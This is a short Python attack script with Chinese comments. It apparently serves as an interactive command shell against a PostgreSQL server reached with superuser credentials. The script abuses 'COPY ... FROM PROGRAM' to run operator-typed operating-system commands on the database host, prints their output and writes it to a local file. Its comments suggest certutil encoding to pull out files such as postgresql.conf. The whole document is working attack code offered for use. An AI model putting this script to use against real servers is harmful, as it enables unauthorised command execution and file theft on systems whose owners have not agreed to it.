# coding utf-8
# by x2n
import psycopg2
import base64
try:
    conn = psycopg2.connect(
        host="xxx.xxx.xxx.xxxx",
        database="postgres",
        user="postgres",
        password="xxxxx",
        port="6666"
    )
    print("Connection established successfully")
    while True:
        try:
            cur = conn.cursor()
            # cur.execute("DROP TABLE IF EXISTS cmd_exec;") 确保这个表是不存在的，若存在则应该drop掉
            cur.execute("CREATE TABLE cmd_exec(cmd_output text);")
            cmd =str(input("输出之行的cmd命令："))
            cur.execute("COPY cmd_exec FROM PROGRAM '"+cmd+"' ;")
            # dir > 1.txt && certutil -encode 1.txt 2.txt
            # certutil -encode postgresql.conf 2.txt
            # type 2.txt
            cur.execute("SELECT * FROM cmd_exec;")
            rows = cur.fetchall()
            cur.execute("DROP TABLE IF EXISTS cmd_exec;")
            cur.close()
            res = ""
            for i in range(0,len(rows)):
                res =res + str(rows[i])[2:-3]+"\n"
            print(res)
            #print(type(res))
            file = open("./res.txt","w")
            #res = base64.b64decode(res)
            file.write(res)
            file.close()
            conn.commit()
        except psycopg2.Error as e:
            print(e)
            break #有可能因为编码原因出现报错
except psycopg2.Error as e:
    print("Unable to connect to the database")
    print(e)
finally:
    conn.close()